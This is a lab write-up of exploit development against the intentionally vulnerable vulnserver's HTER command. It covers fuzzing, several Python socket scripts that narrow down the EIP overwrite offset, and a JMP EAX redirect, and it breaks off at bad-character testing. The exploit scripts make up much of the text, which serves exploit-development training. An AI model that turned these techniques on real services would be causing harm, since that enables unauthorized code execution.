1. We start fuzzing and after several failed attempts at a manual crash with python, I kept narrowing down
the payload size, and also quickly stopping the fuzz (Ctrl+C) until I tried:

generic_send_tcp 192.168.162.141 9999 hter.spk  0 29


Total Number of Strings is 681
Fuzzing
Fuzzing Variable 0:29
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 5000
Fuzzing Variable 0:30
Variablesize= 2050
Fuzzing Variable 0:31
Variablesize= 115

2. And this crashed it. So the payload size had to be either 5000, 2050, or 115. 
3. Reviewing the wireshark capture, there was a tcp stream with a payload of 2055 bytes of As that *didn't* end in:
HTER RUNNING FINE
UNKNOWN COMMAND

4. So I tried the following exploit:



#!/usr/bin/python

import socket
import os
import sys

buffer="HTER " + "A"*2055 

print "[*] Sending evil HTER request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.162.141", 9999))
expl.send(buffer)
expl.close()


5. Note that in Wireshark the tcp stream loko like:

HTER
AAAAAAAAAAAA...AAAAAA:\Welcome to Vulnerable Server! Enter HELP for help.

There is no space (" ") between the HTER command and the first A character but a space was still required in the script.  
Additionally, I tried with the ":\" but this did not trigger the exploit

6. Once we ran the exploit we see the EIP overwritten as such:

EIP AAAAAAAA

Note: This is not like the usual overwrite of 42424242 or AAAA.
Our script sends A characters. However the EIP is overwritten with 0xAAAAAAAA, 
instead of 0x41414141. It seems our buffer is somehow converted into hex byte array.

Usually, when we successfully overflow a buffer with a string of "A"s, a 4-byte string 
"AAAA" will overwrite EIP with "41414141".  In this case however, an 8-byte string 
"AAAAAAAA" is required to overwrite EIP with "AAAAAAAA"

8. To confirm, send various strings like:

abcde
fghij
01234

Note: 2055 A chars overwrites the EIP and since it is evenly divisible by 5 we will
send 5-byte lengthed strings like "abcde"*411, "fghi"*411, etc...

9. Updating our script with various types of payloads as such:

#!/usr/bin/python

import socket
import os
import sys

#buffer="HTER "+"A"*(2055) 
#buffer="HTER "+"abcde"*411
#buffer="HTER "+"fghij"*411
#buffer="HTER "+"01234"*411
#buffer="HTER "+"11223"*411
#buffer="HTER "+"78899"*411
buffer="HTER "+"35856"*411

print "[*] Sending evil HTER request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.162.141", 9999))
expl.send(buffer)
expl.close()


RESULTS:

STRING    RESULT
----------------

abcde  |  CDABDEBC
fghij  |  <nothing>. //Perhaps a bad char in there 
01234  |  23013412
11223  |  22112312
78899  |  89789988
35856  |  85355658


10. Send the payloads and observe in memory that we have:

The string is capitalized
The string seems to be already treated as a hex-encoded byte array
The order of the bytes gets rearranged to:
--1. second byte
--2. first byte
--3. last byte
--4. seccond hex char of the first byte + first hex char of the second byte

11. Now that we understand how the register is being overwritten, we need to find
where the rest of our buffer is located in memory

12. Reissue the exploit A with chars again since these are easy to identify. Once we
do this we see that our buffer is sitting above the address we land at in our stack.

13. We also see there is an SEH exception. Passing the exception yields the following
reg vals:

EDX 00AAAAAA 
EBP AAAAAAAA
EIP AAAAAAAA

14. Sending our usual unique string doesn't appear to crash the program in a way that
allows us to find an offset. So we use a different approach

15. Breaking the 2055 payload into equal portions of 137 bytes, for a total of 15 sectionsour new python payload looks like:

#!/usr/bin/python

import socket
import os
import sys

buffer="HTER " + "1"*137 
buffer+="2"*137
buffer+="3"*137
buffer+="4"*137
buffer+="5"*137
buffer+="6"*137
buffer+="7"*137
buffer+="8"*137
buffer+="9"*137
buffer+="a"*137
buffer+="b"*137
buffer+="c"*137
buffer+="d"*137
buffer+="e"*137
buffer+="f"*137

print "[*] Sending evil HTER request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.162.141", 9999))
expl.send(buffer)
expl.close()

16. We get tha tour EIP register is overwritten as such:
FFFFFFFF

17. This indicates that our offset exists somewhere in the final 137 bytes i.e.
somewhere between 1918 - 2055

18. We can continue to narrow this down using the same technqiue but on the last 137
bytes now. 

19. Issuing following payload:

#!/usr/bin/python

import socket
import os
import sys

#135

buffer="HTER " + "A"*1920
buffer+="1"*9
buffer+="2"*9
buffer+="3"*9
buffer+="4"*9
buffer+="5"*9
buffer+="6"*9
buffer+="7"*9
buffer+="8"*9
buffer+="9"*9
buffer+="a"*9
buffer+="b"*9
buffer+="c"*9
buffer+="d"*9
buffer+="e"*9
buffer+="f"*9

print "[*] Sending evil HTER request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.162.141", 9999))
expl.send(buffer)
expl.close()

Note: We rounded off the 1918 to an ecen 1920 since left us with 135 bytes left to filter
and 135 can be nicely divded into small increments of 15. This would not disable us from
still identifying the offset because if the offset *did* start at 1918, then the first two
would be overwritten by As and then 1s. Whereasif the offset occurred later in the buffer
with the other As, then we'd see either all As, or As mixed with either 9s or Bs.

20. After issuing the payload we see out EIP reg overwritten as follows:

EIP    FFEFEEEE

21. This indicates that our offset exists somewhere between: 1920 + 117 = 2037 and 2055
22. Editing our payload once again to:

#!/usr/bin/python

import socket
import os
import sys

#135

buffer="HTER " + "A"*2037
buffer+="1"*1
buffer+="2"*1
buffer+="3"*1
buffer+="4"*1
buffer+="5"*1
buffer+="6"*1
buffer+="7"*1
buffer+="8"*1
buffer+="9"*1
buffer+="a"*1
buffer+="b"*1
buffer+="c"*1
buffer+="d"*2
buffer+="e"*2
buffer+="f"*2

print "[*] Sending evil HTER request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.162.141", 9999))
expl.send(buffer)
expl.close()

Note: Since we had 18 bytes to filter through, and 15 sections, I selected 3 characters
to be (*2) to make up for the remaining three buffer slots.

23. Issuing this payload yields EIP to be overwritten as:

EIP   BC9A7856 

24. Noting that 5 is the lowest/first character in our original buffer indicates that our
offset must be 2041. Meaning our slots are 2042,2043,2044,2045,2046,2047,2048,2049. Test
this theory with the below script:

#!/usr/bin/python

import socket
import os
import sys


buffer="HTER " + "A"*2041 + "B"*8 + "C"*6

print "[*] Sending evil HTER request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.162.141", 9999))
expl.send(buffer)
expl.close()

25. Issuing this reveals EIP gets cleanly overwritten with 'BBBBBBBB'
26. We also see that ESP contains the address pointing to our second buffer of "C"s
ESP    00B7FA0C --> 00CCCC
27. Additionally, we see the the EAX reg contains the address pointing to the beginning ofour first buffer:

EAX    00B7F60C --> AAAAAAAA...AAA

28. Thus we need the address of a JMP EAX instruction
29. Searching the executable modules (essfunc.dll) for JMP EAX we find one at address:
7C954F40   FFE0             JMP EAX

30. Plugging this into our script as follows:

#!/usr/bin/python

import socket
import os
import sys

#625011B1   FFE0             JMP EAX

buffer="HTER " + "A"*2041 + "625011B1" + "C"*6

print "[*] Sending evil HTER request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.162.141", 9999))
expl.send(buffer)
expl.close()

31. Issusing the payload and checking EIP, we get:
EIP    B1115052

32. So we need to put this in little-endian (reverse it) and reissue the payload:

#!/usr/bin/python

import socket
import os
import sys

#625011B1   FFE0             JMP EAX

buffer="HTER " + "A"*2041 + "B1115062" + "C"*6

print "[*] Sending evil HTER request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.162.141", 9999))
expl.send(buffer)
expl.close()

33. We place a breakpoint at address: 625011B1 and reissue the payload.
34. We observe that EIP was properly overwritten and that we hit our breakpoint
35. Taking the jump with F7 takes us the beginning of our fat buffer 
36. For the sake of exercise, let's determine bad chars using find_badchars.py

First copying a version of the original to the hter module directory. This was
the updated/edited version from the student forums.

Replace all occurrences of ovas.exe with vulnserver.exe using:
sed -i 's/ovas.exe/vulnserver.exe/g' find_badchars.py

Same with 'ovas':
sed -i 's/ovas/vulnserver/g' find_badchars.py

Update the request template to match our HTER command request  on lines:
31, 82, and 142. Also edit the ports where necessary.

-Comment out 31
-Manually add our string for 82 and 142







  











 


